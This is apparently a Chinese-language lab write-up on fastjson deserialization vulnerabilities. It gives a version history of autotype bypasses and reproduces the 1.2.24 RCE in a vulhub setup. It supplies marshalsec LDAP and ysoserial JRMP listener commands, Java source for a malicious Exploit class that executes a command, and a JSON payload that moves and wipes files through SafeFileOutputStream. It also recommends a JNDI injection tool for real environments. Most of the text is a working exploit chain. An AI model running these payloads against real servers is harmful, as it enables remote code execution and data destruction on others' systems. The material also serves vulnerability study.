1.2.24版本为分界线，包括此版本和之前的版本默认开启autotype，之后的版本默认关闭并且加入checkAutotype来做黑名单处理。
1.2.47，1.2.68均发现autotype绕过漏洞，即autotype关闭也可触发RCE。其中1.2.68要求苛刻，一般需要自写外部类。
1.2.69之后直接增加反序列化开关，自此告别反序列化漏洞。
1.2.70之后存在和其他json(net.sf.json-lib/org.json)结合的java SSRF很苛刻的RCE。
我们使用1.2.24环境并下载jar包
https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
https://repo.maven.apache.org/maven2/com/alibaba/fastjson/1.2.24/fastjson-1.2.24.jar
8090端口POST任意JSON即可
Content-Type: application/json;charset=UTF-8
{"age":20,"name":"Bob"}

https://github.com/mbechler/marshalsec
（PS:ldap适用 JDK11.0.1/8u191/7u201/6u211之前，rmi适用JDK8u113/7u122/6u132之前，所以ldap攻击面更广，这里我用的是ldap://127.0.0.1:1389/Object）

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:81/#Exploit" 1389

81要起一个http端口放置Exploit.class，准备一个Exploit.java然后直接手动编译为Exploit.class。
javac Exploit.java
代码如下

public class Exploit {    static {        try {            Runtime.getRuntime().exec("calc");        } catch (Exception e) {        }    }}

这种攻击方式称为JNDI注入，远程加载http服务上的类。在实际环境中去JNDI注入，此项目能大大增加效率。https://github.com/feihong-cs/JNDIExploit

ysoserial还提供了一种RMI反序列化的攻击方式，和JNDI注入不同，不需要访问含恶意类的http服务，而是和RMI服务通信过程中被反序列化了。

java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "calc"

{"@type":"java.lang.AutoCloseable","@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream","targetPath":"2.txt","tempPath":"1.txt"}

需要aspectjtools-1.9.6.jar，可将1.txt复制到2.txt，同时会清空1.txt。注意，此操作不可逆，如果再将2.txt复制到1.txt，会因为已经存在1.txt而无法移动，2.txt也会清空。
如果1.txt和2.txt都不存在，可以用来新建空白文件。
